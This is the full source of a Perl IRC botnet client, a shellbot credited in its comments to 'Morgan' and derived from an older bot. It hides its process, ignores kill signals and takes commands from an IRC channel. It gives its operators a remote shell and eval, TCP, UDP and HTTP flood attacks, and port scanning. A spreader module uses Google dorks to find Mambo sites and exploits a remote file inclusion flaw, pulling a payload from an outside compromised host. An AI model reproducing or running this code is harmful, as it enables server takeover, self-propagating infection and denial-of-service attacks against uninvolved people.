   #!/usr/bin/perl
   # Morgan has hacked you!
   # Morgan Argentina, santiago del estero
   # irc.irc-microsoft.com
   # This code is based on atrix (brazil) shellbot, somebody ripped all the credits, but its obviusly a rip.
   # so the original author is atrix. the spread perl code was developed by sirhot (i am not sure) he is morocco.
   # correo: movimiento.04.12@gmail.com

   my $processo = '[mov0412]';

   # This is my l337 anti-clon code roflcopter.
   # you can rip it lamer, go ahead!

   if (`ps u` =~ /mov0412/)
   {
   # print "se salio por ser clon xD";
    exit;
   }

   my $linas_max='5';
   my $sleep='5';
   my @adms=("beford","][GB][","Zetha", "desKrriado", "uyx", "lithyum");
   my @hostauth=("NetworkAdministrator","fbi.gov");
   my @canais=("#mov0412#");
   my $pwned="/tmp/kde-root";
   my $nick='mov0412';
   my $ircname ='whoami';
   chop (my $realname = 'id');
   $servidor='irc.com.ve' unless $servidor;
   my $porta='6667';
   my $VERSAO = '0.4';
   $SIG{'INT'} = 'IGNORE';
   $SIG{'HUP'} = 'IGNORE';
   $SIG{'TERM'} = 'IGNORE';
   $SIG{'CHLD'} = 'IGNORE';
   $SIG{'PS'} = 'IGNORE';
   use IO::Socket;
   use Socket;
   use IO::Select;
   chdir("/");
   $servidor="$ARGV[0]" if $ARGV[0];
   $0="$processo"."\0"x16;;
   my $pid=fork;
   exit if $pid;
   die "Problema com o fork: $!" unless defined($pid);

   our %irc_servers;
   our %DCC;
   my $dcc_sel = new IO::Select->new();

   $sel_cliente = IO::Select->new();
   sub sendraw {
     if ($#_ == '1') {
       my $socket = $_[0];
       print $socket "$_[1]\n";
     } else {
         print $IRC_cur_socket "$_[0]\n";
     }
   }

   sub conectar {
      my $meunick = $_[0];
      my $servidor_con = $_[1];
      my $porta_con = $_[2];

      my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$servidor_con", PeerPort=>$porta_con) or return(1);
      if (defined($IRC_socket)) {
        $IRC_cur_socket = $IRC_socket;

        $IRC_socket->autoflush(1);
        $sel_cliente->add($IRC_socket);

        $irc_servers{$IRC_cur_socket}{'host'} = "$servidor_con";
        $irc_servers{$IRC_cur_socket}{'porta'} = "$porta_con";
        $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
        $irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;
        nick("$meunick");
        sendraw("USER $ircname ".$IRC_socket->sockhost." $servidor_con :$realname");
        sleep 1;
      }
   }
   my $line_temp;
   while( 1 ) {
      while (!(keys(%irc_servers))) { conectar("$nick", "$servidor", "$porta"); }
      delete($irc_servers{''}) if (defined($irc_servers{''}));
      my @ready = $sel_cliente->can_read(0);
      next unless(@ready);
      foreach $fh (@ready) {
        $IRC_cur_socket = $fh;
        $meunick = $irc_servers{$IRC_cur_socket}{'nick'};
        $nread = sysread($fh, $msg, 4096);
        if ($nread == 0) {
           $sel_cliente->remove($fh);
           $fh->close;
           delete($irc_servers{$fh});
        }
        @lines = split (/\n/, $msg);

        for(my $c=0; $c<= $#lines; $c++) {
          $line = $lines[$c];
          $line=$line_temp.$line if ($line_temp);
          $line_temp='';
          $line =~ s/\r$//;
          unless ($c == $#lines) {
            parse("$line");
          } else {
              if ($#lines == 0) {
                parse("$line");
              } elsif ($lines[$c] =~ /\r$/) {
                  parse("$line");
              } elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
                  parse("$line");
              } else {
                  $line_temp = $line;
              }
          }
         }
      }
   }

   sub parse {
      my $servarg = shift;
      if ($servarg =~ /^PING \:(.*)/) {
        sendraw("PONG :$1");
      } elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
          my $pn=$1; my $hostmask= $3; my $onde = $4; my $args = $5;
          if ($args =~ /^\001VERSION\001$/) {
            notice("$pn", "\001VERSION mIRC v6.16 Khaled Mardam-Bey\001");
          }
          if (grep {$_ =~ /^\Q$hostmask\E$/i } @hostauth) {
          if (grep {$_ =~ /^\Q$pn\E$/i } @adms) {
            if ($onde eq "$meunick"){
              shell("$pn", "$args");
            }
            if ($args =~ /^(\Q$meunick\E|\!say)\s+(.*)/ ) {
               my $natrix = $1;
               my $arg = $2;
               if ($arg =~ /^\!(.*)/) {
                 ircase("$pn","$onde","$1") unless ($natrix eq "!bot" and $arg =~ /^\!nick/);
               } elsif ($arg =~ /^\@(.*)/) {
                   $ondep = $onde;
                   $ondep = $pn if $onde eq $meunick;
                   bfunc("$ondep","$1");
               } else {
                   shell("$onde", "$arg");
               }
            }
          }
       }
      } elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
          if (lc($1) eq lc($meunick)) {
            $meunick=$4;
            $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
          }
      } elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
          nick("$meunick|".int rand(999999));
      } elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
          $meunick = $2;
          $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
          $irc_servers{$IRC_cur_socket}{'nome'} = "$1";
          foreach my $canal (@canais) {
            sendraw("JOIN $canal ddosit");
          }
      }
   }


   sub bfunc {
     my $printl = $_[0];
     my $funcarg = $_[1];
     if (my $pid = fork) {
        waitpid($pid, 0);
     } else {
         if (fork) {
            exit;
          } else {
              if ($funcarg =~ /^portscan (.*)/) {
                my $hostip="$1";
                my @portas=("21","23","25","80","113","135","445","1025","5000","6660","6661","6662","6663","6665","6666","6667","6668","6669","7000","8080");
                my (@aberta, %porta_banner);
            sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[SCAN]\002 Scanning ".$1." for open ports.");
                foreach my $porta (@portas)  {
                   my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto => 'tcp', Timeout => 4);
                   if ($scansock) {
                      push (@aberta, $porta);
                      $scansock->close;
                   }
                }

                if (@aberta) {
                  sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[SCAN]\002 Open port(s): @aberta");
                } else {
                  sendraw($IRC_cur_socket,"PRIVMSG $printl :\002[SCAN]\002 No open ports found");
                }
              }
              if ($funcarg =~ /^tcpflood\s+(.*)\s+(\d+)\s+(\d+)/) {
            sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[TCP-DDOS]\002 Attacking ".$1.":".$2." for ".$3." seconds.");
            my $itime = time;
            my ($cur_time);
                $cur_time = time - $itime;
            while ($3>$cur_time){
                $cur_time = time - $itime;
            &tcpflooder("$1","$2","$3");
                }
            sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[TCP-DDOS]\002 Finished with attacking ".$1.":".$2.".");
              }
                  if ($funcarg =~ /^version/) {
           sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[VERSION]\002 perlb0t ver ".$VERSAO);
                  }
              if ($funcarg =~ /^google\s+(\d+)\s+(.*)/) {
            sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[GOOGLE]\002 Scanning for unpatched mambo for ".$1." seconds.");
            srand;
            my $itime = time;
            my ($cur_time);
            my ($exploited);

            $boturl=$2;
                $cur_time = time - $itime;
            $exploited = 0;
           while($1>$cur_time){
               $cur_time = time - $itime;
               @urls=fetch();
               foreach $url (@urls) {
               $cur_time = time - $itime;
               #sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[bef\002ord]\002 " .$url. ".");

               my $path = "";
               my $file = "";
               ($path, $file) = $url =~ /^(.+)\/(.+)$/;

               #$url = $host[1]."/protection.php?action=logout&siteurl=http://hessen-duo.de/.dns/cmd";
               #$url =$path."/modules/Forums/admin/admin_styles.php?phpbb_root_path=http://tododescargas.com.ve/images/.bot/";

               # i could use chr() shit over here too, like morgan but wtf that is not 'encryption' as he calls it.
               # so you can go after this pwned .ve n00b because i am hosting my shit on his site. haha! noob!

               $url =$path."/index.php?_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path=http://tododescargas.com.ve/images/.bot/common.php?";
               #sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[GOOGLE]\002 Exploiting ".$url);

               #$page = "juaxked";
               $page = http_query($url);
               if ( $page =~ /juaxked/ ){
                   $exploited = $exploited + 1;
               }
               }
           }
            sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[GOOGLE]\002 Exploited ".$exploited." boxes in ".$1." seconds.");
              }
              if ($funcarg =~ /^httpflood\s+(.*)\s+(\d+)/) {
            sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[HTTP-DDOS]\002 Attacking ".$1.":80 for ".$2." seconds.");
            my $itime = time;
            my ($cur_time);
                $cur_time = time - $itime;
            while ($2>$cur_time){
                $cur_time = time - $itime;
            my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$1, PeerPort=>80);
                print $socket "GET / HTTP/1.1\r\nAccept: */*\r\nHost: ".$1."\r\nConnection: Keep-Alive\r\n\r\n";
            close($socket);
                }
            sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[HTTP-DDOS]\002 Finished with attacking ".$1.".");
              }
              if ($funcarg =~ /^udpflood\s+(.*)\s+(\d+)\s+(\d+)/) {
                sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[UDP-DDOS]\002 Attacking ".$1." with ".$2." Kb packets for ".$3." seconds.");
                my ($dtime, %pacotes) = udpflooder("$1", "$2", "$3");
                $dtime = 1 if $dtime == 0;
                my %bytes;
                $bytes{igmp} = $2 * $pacotes{igmp};
                $bytes{icmp} = $2 * $pacotes{icmp};
                $bytes{o} = $2 * $pacotes{o};
                $bytes{udp} = $2 * $pacotes{udp};
                $bytes{tcp} = $2 * $pacotes{tcp};

                sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[UDP-DDOS]\002 Sent ".int(($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024)." Kb in ".$dtime." seconds to ".$1.".");

              }
              exit;
          }
     }
   }

   sub ircase {
     my ($kem, $printl, $case) = @_;

     if ($case =~ /^join (.*)/) {
        j("$1");
      }
      if ($case =~ /^part (.*)/) {
         p("$1");
      }
      if ($case =~ /^rejoin\s+(.*)/) {
         my $chan = $1;
         if ($chan =~ /^(\d+) (.*)/) {
           for (my $ca = 1; $ca <= $1; $ca++ ) {
             p("$2");
             j("$2");
           }
         } else {
             p("$chan");
             j("$chan");
         }
      }
      if ($case =~ /^op/) {
         op("$printl", "$kem") if $case eq "op";
         my $oarg = substr($case, 3);
         op("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
      }
      if ($case =~ /^deop/) {
         deop("$printl", "$kem") if $case eq "deop";
         my $oarg = substr($case, 5);
         deop("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
      }
      if ($case =~ /^msg\s+(\S+) (.*)/) {
         msg("$1", "$2");
      }
      if ($case =~ /^flood\s+(\d+)\s+(\S+) (.*)/) {
         for (my $cf = 1; $cf <= $1; $cf++) {
           msg("$2", "$3");
         }
      }
      if ($case =~ /^ctcp\s+(\S+) (.*)/) {
         ctcp("$1", "$2");
      }
      if ($case =~ /^ctcpflood\s+(\d+)\s+(\S+) (.*)/) {
         for (my $cf = 1; $cf <= $1; $cf++) {
           ctcp("$2", "$3");
         }
      }
      if ($case =~ /^nick (.*)/) {
         nick("$1");
      }
      if ($case =~ /^connect\s+(\S+)\s+(\S+)/) {
          conectar("$2", "$1", 6667);
      }
      if ($case =~ /^raw (.*)/) {
         sendraw("$1");
      }
      if ($case =~ /^eval (.*)/) {
        eval "$1";
      }
   }

   sub shell {
     my $printl=$_[0];
     my $comando=$_[1];
     if ($comando =~ /cd (.*)/) {
       chdir("$1") || msg("$printl", "No such file or directory");
       return;
     }
     elsif ($pid = fork) {
        waitpid($pid, 0);
     } else {
         if (fork) {
            exit;
          } else {
              my @resp=`$comando 2>&1 3>&1`;
              my $c=0;
              foreach my $linha (@resp) {
                $c++;
                chop $linha;
                sendraw($IRC_cur_socket, "PRIVMSG $printl :$linha");
                if ($c == "$linas_max") {
                  $c=0;
                  sleep $sleep;
                }
              }
              exit;
          }
     }
   }

   sub tcpflooder {
    my $itime = time;
    my ($cur_time);
    my ($ia,$pa,$proto,$j,$l,$t);
    $ia=inet_aton($_[0]);
    $pa=sockaddr_in($_[1],$ia);
    $ftime=$_[2];
    $proto=getprotobyname('tcp');
    $j=0;$l=0;
    $cur_time = time - $itime;
    while ($l<1000){
     $cur_time = time - $itime;
     last if $cur_time >= $ftime;
     $t="SOCK$l";
     socket($t,PF_INET,SOCK_STREAM,$proto);
     connect($t,$pa)||$j--;
     $j++;$l++;
    }
    $l=0;
    while ($l<1000){
     $cur_time = time - $itime;
     last if $cur_time >= $ftime;
     $t="SOCK$l";
     shutdown($t,2);
     $l++;
    }
   }

   sub udpflooder {
     my $iaddr = inet_aton($_[0]);
     my $msg = 'A' x $_[1];
     my $ftime = $_[2];
     my $cp = 0;
     my (%pacotes);
     $pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;

     socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;
     socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;
     socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;
     socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;
     return(undef) if $cp == 4;
     my $itime = time;
     my ($cur_time);
     while ( 1 ) {
        for (my $porta = 1; $porta <= 65000; $porta++) {
          $cur_time = time - $itime;
          last if $cur_time >= $ftime;
          send(SOCK1, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{igmp}++;
          send(SOCK2, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{udp}++;
          send(SOCK3, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{icmp}++;
          send(SOCK4, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++;

          for (my $pc = 3; $pc <= 255;$pc++) {
            next if $pc == 6;
            $cur_time = time - $itime;
            last if $cur_time >= $ftime;
            socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;
            send(SOCK5, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{o}++;
          }
        }
        last if $cur_time >= $ftime;
     }
     return($cur_time, %pacotes);
   }

   sub ctcp {
      return unless $#_ == 1;
      sendraw("PRIVMSG $_[0] :\001$_[1]\001");
   }
   sub msg {
      return unless $#_ == 1;
      sendraw("PRIVMSG $_[0] :$_[1]");
   }
   sub notice {
      return unless $#_ == 1;
      sendraw("NOTICE $_[0] :$_[1]");
   }
   sub op {
      return unless $#_ == 1;
      sendraw("MODE $_[0] +o $_[1]");
   }
   sub deop {
      return unless $#_ == 1;
      sendraw("MODE $_[0] -o $_[1]");
   }
   sub j { &join(@_); }
   sub join {
      return unless $#_ == 0;
      sendraw("JOIN $_[0]");
   }
   sub p { part(@_); }
   sub part {
     sendraw("PART $_[0]");
   }
   sub nick {
     return unless $#_ == 0;
     sendraw("NICK $_[0]");
   }
   sub quit {
     sendraw("QUIT :$_[0]");
   }

   # Spreader
   # this 'spreader' code isnot mine, i dont know who coded it.


   sub fetch(){
       my $rnd=(int(rand(9999)));
       my $n= 50;
       if ($rnd<5000) { $n<<=1;}
       my $s= (int(rand(10)) * $n);

   my @str=("Powered by Mambo",
   "inurl:%22.com/index.php?option=com_content%22",
   "inurl:%22.net/index.php?option=com_content%22",
   "inurl:%22.org/index.php?option=com_content%22",
   "inurl:%22.info/index.php?option=com_content%22",
   "inurl:%22.gov/index.php?option=com_content%22",
   "inurl:%22.mil/index.php?option=com_content%22",
   "inurl:%22.edu/index.php?option=com_content%22",
   "inurl:%22.aero/index.php?option=com_content%22",
   "inurl:%22.name/index.php?option=com_content%22",
   "inurl:%22.us/index.php?option=com_content%22",
   "inurl:%22.ca/index.php?option=com_content%22",
   "inurl:%22.mx/index.php?option=com_content%22",
   "inurl:%22.pa/index.php?option=com_content%22",
   "inurl:%22.ni/index.php?option=com_content%22",
   "inurl:%22.cu/index.php?option=com_content%22",
   "inurl:%22.pr/index.php?option=com_content%22",
   "inurl:%22.ve/index.php?option=com_content%22",
   "inurl:%22.co/index.php?option=com_content%22",
   "inurl:%22.pe/index.php?option=com_content%22",
   "inurl:%22.ec/index.php?option=com_content%22",
   "inurl:%22.py/index.php?option=com_content%22",
   "inurl:%22.cl/index.php?option=com_content%22",
   "inurl:%22.uy/index.php?option=com_content%22",
   "inurl:%22.ar/index.php?option=com_content%22",
   "inurl:%22.br/index.php?option=com_content%22",
   "inurl:%22.bo/index.php?option=com_content%22",
   "inurl:%22.au/index.php?option=com_content%22",
   "inurl:%22.nz/index.php?option=com_content%22",
   "inurl:%22.cz/index.php?option=com_content%22",
   "inurl:%22.kr/index.php?option=com_content%22",
   "inurl:%22.jp/index.php?option=com_content%22",
   "inurl:%22.th/index.php?option=com_content%22",
   "inurl:%22.tw/index.php?option=com_content%22",
   "inurl:%22.ph/index.php?option=com_content%22",
   "inurl:%22.cn/index.php?option=com_content%22",
   "inurl:%22.fi/index.php?option=com_content%22",
   "inurl:%22.de/index.php?option=com_content%22",
   "inurl:%22.es/index.php?option=com_content%22",
   "inurl:%22.pt/index.php?option=com_content%22",
   "inurl:%22.ch/index.php?option=com_content%22",
   "inurl:%22.se/index.php?option=com_content%22",
   "inurl:%22.su/index.php?option=com_content%22",
   "inurl:%22.it/index.php?option=com_content%22",
   "inurl:%22.gr/index.php?option=com_content%22",
   "inurl:%22.al/index.php?option=com_content%22",
   "inurl:%22.dk/index.php?option=com_content%22",
   "inurl:%22.pl/index.php?option=com_content%22",
   "inurl:%22.biz/index.php?option=com_content%22",
   "inurl:%22.int/index.php?option=com_content%22",
   "inurl:%22.pro/index.php?option=com_content%22",
   "inurl:%22.museum/index.php?option=com_content%22",
   "inurl:%22.coop/index.php?option=com_content%22",
   "inurl:%22.af/index.php?option=com_content%22",
   "inurl:%22.ad/index.php?option=com_content%22",
   "inurl:%22.ao/index.php?option=com_content%22",
   "inurl:%22.ai/index.php?option=com_content%22",
   "inurl:%22.aq/index.php?option=com_content%22",
   "inurl:%22.ag/index.php?option=com_content%22",
   "inurl:%22.an/index.php?option=com_content%22",
   "inurl:%22.sa/index.php?option=com_content%22",
   "inurl:%22.dz/index.php?option=com_content%22",
   "inurl:%22.ar/index.php?option=com_content%22",
   "inurl:%22.am/index.php?option=com_content%22",
   "inurl:%22.aw/index.php?option=com_content%22",
   "inurl:%22.at/index.php?option=com_content%22",
   "inurl:%22.az/index.php?option=com_content%22",
   "inurl:%22.bs/index.php?option=com_content%22",
   "inurl:%22.bh/index.php?option=com_content%22",
   "inurl:%22.bd/index.php?option=com_content%22",
   "inurl:%22.bb/index.php?option=com_content%22",
   "inurl:%22.be/index.php?option=com_content%22",
   "inurl:%22.bz/index.php?option=com_content%22",
   "inurl:%22.bj/index.php?option=com_content%22",
   "inurl:%22.bm/index.php?option=com_content%22",
   "inurl:%22.bt/index.php?option=com_content%22",
   "inurl:%22.by/index.php?option=com_content%22",
   "inurl:%22.ba/index.php?option=com_content%22",
   "inurl:%22.bw/index.php?option=com_content%22",
   "inurl:%22.bn/index.php?option=com_content%22",
   "inurl:%22.bg/index.php?option=com_content%22",
   "inurl:%22.bf/index.php?option=com_content%22",
   "inurl:%22.bi/index.php?option=com_content%22",
   "inurl:%22.vc/index.php?option=com_content%22",
   "inurl:%22.kh/index.php?option=com_content%22",
   "inurl:%22.cm/index.php?option=com_content%22",
   "inurl:%22.td/index.php?option=com_content%22",
   "inurl:%22.cs/index.php?option=com_content%22",
   "inurl:%22.cy/index.php?option=com_content%22",
   "inurl:%22.km/index.php?option=com_content%22",
   "inurl:%22.cg/index.php?option=com_content%22",
   "inurl:%22.cd/index.php?option=com_content%22",
   "inurl:%22.dj/index.php?option=com_content%22",
   "inurl:%22.dm/index.php?option=com_content%22",
   "inurl:%22.ci/index.php?option=com_content%22",
   "inurl:%22.cr/index.php?option=com_content%22",
   "inurl:%22.hr/index.php?option=com_content%22",
   "inurl:%22.kp/index.php?option=com_content%22",
   "inurl:%22.eg/index.php?option=com_content%22",
   "inurl:%22.sv/index.php?option=com_content%22",
   "inurl:%22.aw/index.php?option=com_content%22",
   "inurl:%22.er/index.php?option=com_content%22",
   "inurl:%22.sk/index.php?option=com_content%22",
   "inurl:%22.ee/index.php?option=com_content%22",
   "inurl:%22.et/index.php?option=com_content%22",
   "inurl:%22.ge/index.php?option=com_content%22",
   "inurl:%22.fi/index.php?option=com_content%22",
   "inurl:%22.fr/index.php?option=com_content%22",
   "inurl:%22.ga/index.php?option=com_content%22",
   "inurl:%22.gs/index.php?option=com_content%22",
   "inurl:%22.gh/index.php?option=com_content%22",
   "inurl:%22.gi/index.php?option=com_content%22",
   "inurl:%22.gb/index.php?option=com_content%22",
   "inurl:%22.uk/index.php?option=com_content%22",
   "inurl:%22.gd/index.php?option=com_content%22",
   "inurl:%22.gl/index.php?option=com_content%22",
   "inurl:%22.gp/index.php?option=com_content%22",
   "inurl:%22.gu/index.php?option=com_content%22",
   "inurl:%22.gt/index.php?option=com_content%22",
   "inurl:%22.gg/index.php?option=com_content%22",
   "inurl:%22.gn/index.php?option=com_content%22",
   "inurl:%22.gw/index.php?option=com_content%22",
   "inurl:%22.gq/index.php?option=com_content%22",
   "inurl:%22.gy/index.php?option=com_content%22",
   "inurl:%22.gf/index.php?option=com_content%22",
   "inurl:%22.ht/index.php?option=com_content%22",
   "inurl:%22.nl/index.php?option=com_content%22",
   "inurl:%22.hn/index.php?option=com_content%22",
   "inurl:%22.hk/index.php?option=com_content%22",
   "inurl:%22.hu/index.php?option=com_content%22",
   "inurl:%22.in/index.php?option=com_content%22",
   "inurl:%22.id/index.php?option=com_content%22",
   "inurl:%22.ir/index.php?option=com_content%22",
   "inurl:%22.iq/index.php?option=com_content%22",
   "inurl:%22.ie/index.php?option=com_content%22",
   "inurl:%22.is/index.php?option=com_content%22",
   "inurl:%22.ac/index.php?option=com_content%22",
   "inurl:%22.bv/index.php?option=com_content%22",
   "inurl:%22.cx/index.php?option=com_content%22",
   "inurl:%22.im/index.php?option=com_content%22",
   "inurl:%22.nf/index.php?option=com_content%22",
   "inurl:%22.ky/index.php?option=com_content%22",
   "inurl:%22.cc/index.php?option=com_content%22",
   "inurl:%22.ck/index.php?option=com_content%22",
   "inurl:%22.fo/index.php?option=com_content%22",
   "inurl:%22.hm/index.php?option=com_content%22",
   "inurl:%22.fk/index.php?option=com_content%22",
   "inurl:%22.mp/index.php?option=com_content%22",
   "inurl:%22.mh/index.php?option=com_content%22",
   "inurl:%22.pw/index.php?option=com_content%22",
   "inurl:%22.um/index.php?option=com_content%22",
   "inurl:%22.sb/index.php?option=com_content%22",
   "inurl:%22.sj/index.php?option=com_content%22",
   "inurl:%22.tc/index.php?option=com_content%22",
   "inurl:%22.vg/index.php?option=com_content%22",
   "inurl:%22.vi/index.php?option=com_content%22",
   "inurl:%22.wf/index.php?option=com_content%22",
   "inurl:%22.il/index.php?option=com_content%22",
   "inurl:%22.jm/index.php?option=com_content%22",
   "inurl:%22.je/index.php?option=com_content%22",
   "inurl:%22.jo/index.php?option=com_content%22",
   "inurl:%22.kz/index.php?option=com_content%22",
   "inurl:%22.ke/index.php?option=com_content%22",
   "inurl:%22.ki/index.php?option=com_content%22",
   "inurl:%22.kg/index.php?option=com_content%22",
   "inurl:%22.kw/index.php?option=com_content%22",
   "inurl:%22.lv/index.php?option=com_content%22",
   "inurl:%22.ls/index.php?option=com_content%22",
   "inurl:%22.lb/index.php?option=com_content%22",
   "inurl:%22.ly/index.php?option=com_content%22",
   "inurl:%22.lr/index.php?option=com_content%22",
   "inurl:%22.li/index.php?option=com_content%22",
   "inurl:%22.lt/index.php?option=com_content%22",
   "inurl:%22.lu/index.php?option=com_content%22",
   "inurl:%22.mo/index.php?option=com_content%22",
   "inurl:%22.mk/index.php?option=com_content%22",
   "inurl:%22.mg/index.php?option=com_content%22",
   "inurl:%22.my/index.php?option=com_content%22",
   "inurl:%22.mw/index.php?option=com_content%22",
   "inurl:%22.mv/index.php?option=com_content%22",
   "inurl:%22.ml/index.php?option=com_content%22",
   "inurl:%22.mt/index.php?option=com_content%22",
   "inurl:%22.mq/index.php?option=com_content%22",
   "inurl:%22.ma/index.php?option=com_content%22",
   "inurl:%22.mr/index.php?option=com_content%22",
   "inurl:%22.mu/index.php?option=com_content%22",
   "inurl:%22.yt/index.php?option=com_content%22",
   "inurl:%22.md/index.php?option=com_content%22",
   "inurl:%22.mc/index.php?option=com_content%22",
   "inurl:%22.mn/index.php?option=com_content%22",
   "inurl:%22.ms/index.php?option=com_content%22",
   "inurl:%22.mz/index.php?option=com_content%22",
   "inurl:%22.mm/index.php?option=com_content%22",
   "inurl:%22.na/index.php?option=com_content%22",
   "inurl:%22.nr/index.php?option=com_content%22",
   "inurl:%22.np/index.php?option=com_content%22",
   "inurl:%22.ni/index.php?option=com_content%22",
   "inurl:%22.ne/index.php?option=com_content%22",
   "inurl:%22.ng/index.php?option=com_content%22",
   "inurl:%22.nu/index.php?option=com_content%22",
   "inurl:%22.no/index.php?option=com_content%22",
   "inurl:%22.nc/index.php?option=com_content%22",
   "inurl:%22.om/index.php?option=com_content%22",
   "inurl:%22.pk/index.php?option=com_content%22",
   "inurl:%22.ps/index.php?option=com_content%22",
   "inurl:%22.pg/index.php?option=com_content%22",
   "inurl:%22.pn/index.php?option=com_content%22",
   "inurl:%22.pf/index.php?option=com_content%22",
   "inurl:%22.qa/index.php?option=com_content%22",
   "inurl:%22.sy/index.php?option=com_content%22",
   "inurl:%22.cf/index.php?option=com_content%22",
   "inurl:%22.la/index.php?option=com_content%22",
   "inurl:%22.re/index.php?option=com_content%22",
   "inurl:%22.rw/index.php?option=com_content%22",
   "inurl:%22.ro/index.php?option=com_content%22",
   "inurl:%22.ru/index.php?option=com_content%22",
   "inurl:%22.eh/index.php?option=com_content%22",
   "inurl:%22.kn/index.php?option=com_content%22",
   "inurl:%22.ws/index.php?option=com_content%22",
   "inurl:%22.as/index.php?option=com_content%22",
   "inurl:%22.sm/index.php?option=com_content%22",
   "inurl:%22.pm/index.php?option=com_content%22",
   "inurl:%22.vc/index.php?option=com_content%22",
   "inurl:%22.sh/index.php?option=com_content%22",
   "inurl:%22.lc/index.php?option=com_content%22",
   "inurl:%22.va/index.php?option=com_content%22",
   "inurl:%22.st/index.php?option=com_content%22",
   "inurl:%22.sn/index.php?option=com_content%22",
   "inurl:%22.sc/index.php?option=com_content%22",
   "inurl:%22.sl/index.php?option=com_content%22",
   "inurl:%22.sg/index.php?option=com_content%22",
   "inurl:%22.so/index.php?option=com_content%22",
   "inurl:%22.lk/index.php?option=com_content%22",
   "inurl:%22.za/index.php?option=com_content%22",
   "inurl:%22.sd/index.php?option=com_content%22",
   "inurl:%22.se/index.php?option=com_content%22",
   "inurl:%22.sr/index.php?option=com_content%22",
   "inurl:%22.sz/index.php?option=com_content%22",
   "inurl:%22.rj/index.php?option=com_content%22",
   "inurl:%22.tz/index.php?option=com_content%22",
   "inurl:%22.io/index.php?option=com_content%22",
   "inurl:%22.tf/index.php?option=com_content%22",
   "inurl:%22.tp/index.php?option=com_content%22",
   "inurl:%22.tg/index.php?option=com_content%22",
   "inurl:%22.to/index.php?option=com_content%22",
   "inurl:%22.tt/index.php?option=com_content%22",
   "inurl:%22.tn/index.php?option=com_content%22",
   "inurl:%22.tr/index.php?option=com_content%22",
   "inurl:%22.tm/index.php?option=com_content%22",
   "inurl:%22.tv/index.php?option=com_content%22",
   "inurl:%22.ug/index.php?option=com_content%22",
   "inurl:%22.ua/index.php?option=com_content%22",
   "inurl:%22.uz/index.php?option=com_content%22",
   "inurl:%22.vu/index.php?option=com_content%22",
   "inurl:%22.vn/index.php?option=com_content%22",
   "inurl:%22.ye/index.php?option=com_content%22",
   "inurl:%22.yu/index.php?option=com_content%22",
   "inurl:%22.cd/index.php?option=com_content%22",
   "inurl:%22.zm/index.php?option=com_content%22",
   "inurl:%22index.php?option=com_content%22",
   "inurl:%22.zw/index.php?option=com_content%22");

       my $query="www.google.com/custom?q=";
       $query.=$str[(rand(scalar(@str)))];
       $query.="&num=$n&start=$s";
       my @lst=();
       #sendraw("privmsg #mov0412# :googleando: ".$query);
       my $page = http_query($query);

       while ($page =~  m/<a class=l href=\"?http:\/\/([^>\"]+)\"?>/g){
       if ($1 !~ m/google|cache|translate/){
           push (@lst,$1);
       }
       }
       return (@lst);
   }

   sub http_query($){
       my ($url) = @_;
       my $host=$url;
       my $query=$url;
       my $page="";
       $host =~ s/href=\"?http:\/\///;
       $host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
       $query =~s/$host//;
       if ($query eq "") {$query="/";};
       eval {
       local $SIG{ALRM} = sub { die "1";};
       alarm 10;
       my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"80",Proto=>"tcp") or return;
       print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8) Gecko/20051111 Firefox/1.6\r\n\r\n";

       my @r = <$sock>;
       $page="@r";
       alarm 0;
       close($sock);
       };
       return $page;

   }
